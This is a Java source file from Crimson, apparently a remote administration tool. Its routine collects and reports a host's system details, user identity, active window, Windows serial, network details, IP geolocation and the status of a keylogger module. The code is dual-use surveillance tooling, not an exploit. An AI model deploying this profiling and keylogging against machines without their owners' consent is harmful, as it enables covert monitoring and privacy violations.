/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/

package com.subterranean_security.crimson.core.platform;

import java.awt.GraphicsEnvironment;

import com.subterranean_security.crimson.client.Client;
import com.subterranean_security.crimson.client.modules.Keylogger;
import com.subterranean_security.crimson.core.Common;
import com.subterranean_security.crimson.core.platform.info.CPU;
import com.subterranean_security.crimson.core.platform.info.CRIMSON;
import com.subterranean_security.crimson.core.platform.info.DISP;
import com.subterranean_security.crimson.core.platform.info.IPLOC;
import com.subterranean_security.crimson.core.platform.info.JAVA;
import com.subterranean_security.crimson.core.platform.info.LIN;
import com.subterranean_security.crimson.core.platform.info.MOBO;
import com.subterranean_security.crimson.core.platform.info.NET;
import com.subterranean_security.crimson.core.platform.info.NIC;
import com.subterranean_security.crimson.core.platform.info.OS;
import com.subterranean_security.crimson.core.platform.info.OS.OSFAMILY;
import com.subterranean_security.crimson.core.platform.info.RAM;
import com.subterranean_security.crimson.core.platform.info.USER;
import com.subterranean_security.crimson.core.platform.info.WIN;
import com.subterranean_security.crimson.core.profile.SimpleAttribute;
import com.subterranean_security.crimson.core.proto.Delta.EV_ProfileDelta;
import com.subterranean_security.crimson.core.proto.Keylogger.State;
import com.subterranean_security.crimson.universal.Universal;

public final class Platform {

	private Platform() {
	}

	public static final ARCH javaArch = JAVA.getARCH();
	public static final OSFAMILY osFamily = OSFAMILY.get();

	public enum ARCH {
		X86, X64, SPARC, UNSUPPORTED;
		@Override
		public String toString() {
			return super.toString().toLowerCase();
		}
	}

	/**
	 * First Info Gather
	 */
	public static EV_ProfileDelta fig() {

		EV_ProfileDelta.Builder info = EV_ProfileDelta.newBuilder();

		try {
			info.setCvid(Common.cvid);
		} catch (Exception e1) {
			// TODO handle
			info.setCvid(0);
		}

		info.setFig(true);

		info.putStrAttr(SimpleAttribute.CLIENT_VERSION.ordinal(), Common.version);

		for (SimpleAttribute sa : SimpleAttribute.values()) {

			if (!sa.valid(osFamily, Universal.instance)) {
				continue;
			}
			if (sa == SimpleAttribute.NET_EXTERNALIP && !Client.ic.getAllowMiscConnections()) {
				continue;
			}
			String value = queryAttribute(sa);
			if (value != null) {
				info.putStrAttr(sa.ordinal(), value);
			}

		}

		info.addAllGroupAttr(CPU.getAttributes());
		info.addAllGroupAttr(NIC.getAttributes());

		if (!GraphicsEnvironment.isHeadless()) {
			info.addAllGroupAttr(DISP.getAttributes());
		}

		return info.build();
	}

	public static String queryAttribute(SimpleAttribute sa) {
		switch (sa) {
		case CLIENT_CID:
			return "" + Common.cvid;
		case CLIENT_CPU_USAGE:
			return CPU.getClientUsage();
		case CLIENT_ONLINE:
			return "1";
		case CLIENT_RAM_USAGE:
			return RAM.getClientUsage();
		case CLIENT_VERSION:
			return Common.version;
		case CLIENT_BASE_PATH:
			return CRIMSON.getBasePath();
		case CLIENT_INSTALL_DATE:
			return CRIMSON.getInstallDate();
		case CLIENT_STATUS:
			return CRIMSON.getStatus();
		case KEYLOGGER_STATE:
			State s = null;
			if (Keylogger.isInstalled()) {
				s = Keylogger.isOnline() ? State.ONLINE : State.OFFLINE;
			} else {
				s = State.UNINSTALLED;
			}
			return "" + s.ordinal();
		case KEYLOGGER_TRIGGER:
			return "" + Client.ic.getKeyloggerFlushMethod().ordinal();
		case KEYLOGGER_TRIGGER_VALUE:
			return "" + Client.ic.getKeyloggerFlushValue();
		case IPLOC_CITY:
			return IPLOC.getCity();
		case IPLOC_COUNTRY:
			return IPLOC.getCountry();
		case IPLOC_COUNTRYCODE:
			return IPLOC.getCountryCode();
		case IPLOC_LATITUDE:
			return IPLOC.getLatitude();
		case IPLOC_LONGITUDE:
			return IPLOC.getLongitude();
		case IPLOC_REGION:
			return IPLOC.getRegion();
		case JAVA_ARCH:
			return JAVA.getArch();
		case JAVA_PATH:
			return JAVA.getHome();
		case JAVA_START_TIME:
			return JAVA.getStartTime();
		case JAVA_VENDOR:
			return JAVA.getVendor();
		case JAVA_VERSION:
			return JAVA.getVersion();
		case LINUX_DISTRO:
			return LIN.getDistro();
		case LINUX_KERNEL:
			return LIN.getKernel();
		case LINUX_PACKAGES:
			return LIN.getPackages();
		case LINUX_SHELL:
			return LIN.getShell();
		case LINUX_TERMINAL:
			return LIN.getTerminal();
		case LINUX_WM:
			return LIN.getWM();
		case META_FIRST_CONTACT:
			break;
		case MOBO_MANUFACTURER:
			return MOBO.getManufacturer();
		case MOBO_MODEL:
			return MOBO.getModel();
		case NET_DNS1:
			return NET.getDNS1();
		case NET_DNS2:
			return NET.getDNS2();
		case NET_EXTERNALIP:
			return NET.getExternalIP();
		case NET_FQDN:
			return NET.getFQDN();
		case NET_DEFAULT_GATEWAY:
			return NET.getDefaultGateway();
		case NET_HOSTNAME:
			return NET.getHostname();
		case OS_ACTIVE_WINDOW:
			return OS.getActiveWindow();
		case OS_ARCH:
			return OS.getArch();
		case OS_FAMILY:
			return osFamily.toString();
		case OS_LANGUAGE:
			return OS.getLanguage();
		case OS_NAME:
			return OS.getName();
		case OS_TIMEZONE:
			return OS.getTimezone();
		case OS_START_TIME:
			return OS.getStartTime();
		case OS_VIRTUALIZATION:
			return OS.getVirtualization();
		case OS_ENDIAN:
			return OS.getEndian();
		case RAM_FREQUENCY:
			return RAM.getFrequency();
		case RAM_SIZE:
			return RAM.getSize();
		case RAM_TEMP:
			return RAM.getTemperature();
		case RAM_USAGE:
			return RAM.getUsage();
		case USER_HOME:
			return USER.getHome();
		case USER_NAME:
			return USER.getName();
		case USER_STATUS:
			return USER.getStatus();
		case WIN_IE_VERSION:
			return WIN.getIEVersion();
		case WIN_INSTALLDATE:
			return WIN.getInstallTime();
		case WIN_POWERSHELL_VERSION:
			return WIN.getPowerShellVersion();
		case WIN_SERIAL:
			return WIN.getSerial();
		default:
			break;

		}
		return "";
	}

}
